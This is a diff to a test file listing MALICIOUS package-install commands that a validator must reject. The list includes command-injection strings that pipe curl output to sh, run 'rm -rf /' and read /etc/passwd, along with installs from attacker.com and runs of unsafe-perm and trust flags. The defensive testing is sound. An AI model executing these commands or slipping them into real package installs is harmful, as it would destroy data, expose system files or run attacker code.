@@ -12,6 +12,17 @@ const MALICIOUS = [
 	'bun add lodash$(curl atk|sh)',
 	'bun add lodash\nrm -rf /',
 	'pnpm add foo;cat /etc/passwd',
+	// VEC-A: trust-escalating flag must never be accepted.
+	'bun add --trust https://attacker.com/pkg',
+	'npm install --unsafe-perm evil-pkg',
+	'npm install --foreground-scripts evil-pkg',
+	// Remote URL / git installs are rejected (no protocol allowed).
+	'bun add https://attacker.com/pkg',
+	'npm install http://atk/pkg.tgz',
+	'bun add git+https://github.com/atk/pkg',
+	// Flag-only commands have no concrete package spec.
+	'bun add --trust',
+	'bun install',
 ];
 
 const LEGIT = [
